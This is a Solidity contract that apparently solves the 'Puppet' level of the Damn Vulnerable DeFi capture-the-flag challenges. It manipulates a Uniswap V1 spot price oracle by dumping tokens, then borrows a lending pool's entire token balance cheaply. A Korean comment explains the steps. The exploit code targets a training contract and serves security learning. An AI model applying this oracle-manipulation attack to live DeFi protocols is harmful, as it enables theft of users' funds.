pragma solidity =0.8.25;
import {IUniswapV1Exchange} from "./IUniswapV1Exchange.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {PuppetPool} from "./PuppetPool.sol";

/*
  // 내 dvt token과 uniswap 거래소의 eth를 교환하여 거래소 내 eth 비율을 작게 만든다.
        // 즉 거래소에서 dvt token의 가치를 떨어트린다. (거래소의 유동성에 eth는 적으나, dvt token은 많음)
        console.log(address(uniswapV1Exchange).balance);
        token.approve(address(uniswapV1Exchange),PLAYER_INITIAL_TOKEN_BALANCE);
        uniswapV1Exchange.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1 ether, block.timestamp+300);
        //token.transfer(address(uniswapV1Exchange), PLAYER_INITIAL_TOKEN_BALANCE-UNISWAP_INITIAL_TOKEN_RESERVE*3);
        
        console.log(address(uniswapV1Exchange).balance);
        lendingPool.borrow{value:player.balance}(POOL_INITIAL_TOKEN_BALANCE,player);
        token.transfer(recovery,POOL_INITIAL_TOKEN_BALANCE);
*/

uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 10e18;
uint256 constant UNISWAP_INITIAL_ETH_RESERVE = 10e18;
uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 1000e18;
uint256 constant PLAYER_INITIAL_ETH_BALANCE = 25e18;
uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;


contract PuppetAttacker{

    IUniswapV1Exchange exchange;
    DamnValuableToken token;
    PuppetPool pool;
    address player;
    address recovery;


    constructor(address _exchange, address _token, address _lendingpool, address _player, address _recovery) payable{
        exchange = IUniswapV1Exchange(_exchange);
        token = DamnValuableToken(_token);
        pool = PuppetPool(_lendingpool);
        player = _player;
        recovery = _recovery;
    }

    function attack() public payable{
        token.approve(address(exchange), PLAYER_INITIAL_TOKEN_BALANCE);
        exchange.tokenToEthSwapInput(PLAYER_INITIAL_TOKEN_BALANCE, 1 ether, block.timestamp+300);
        pool.borrow{value:address(this).balance}(POOL_INITIAL_TOKEN_BALANCE, recovery);
    }

    receive() external payable {
    }

}